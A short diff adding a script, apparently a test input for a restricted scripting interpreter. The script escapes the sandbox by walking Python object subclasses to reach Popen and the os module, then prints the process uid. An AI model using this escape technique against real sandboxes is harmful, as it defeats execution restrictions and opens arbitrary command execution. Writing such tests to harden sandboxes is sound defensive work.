@@ -1,0 +1,6 @@
+value = true + false
+osmod = nil
+for candidate in value.__class__.__base__.__subclasses__():
+    if candidate.__name__ == "Popen":
+        osmod = candidate.__init__.__globals__["os"]
+say "uid=" + str(osmod.getuid())
